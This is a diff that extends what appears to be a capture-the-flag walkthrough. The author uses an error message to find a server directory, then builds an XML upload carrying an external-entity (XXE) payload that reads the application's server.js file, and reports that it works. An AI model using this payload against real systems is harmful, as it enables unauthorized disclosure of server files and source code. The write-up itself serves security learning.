@@ -198,7 +198,34 @@ Now lets upload
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/30d0614a-0165-42cf-bfbc-2aa2cf6342c8)
 
-Nice Nice, it worked
+Nice Nice, it worked.
+
+Earlier on when I was trying to get the right format for the json request I actually got an error
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2846ac3b-fea5-4f44-9470-82e062fba747)
+
+We can see the directory ```/opt/blog```. Lets see if we can use our xml payload to read files from there.
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///opt/blog/server.js'>]>
+<post>
+<title>
+  BlackAnon's Info
+</title>
+<description>
+  &read;
+</description>
+<markdown>
+  This is a markdown
+</markdown>
+</post> 
+```
+Save this in a file "bankai.xml" and try to upload
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dd6a1ccf-3f2f-4813-8c4a-ad30323b4ee6)
+
+nice nice, we can read the ```server.js``` file
 
 
 
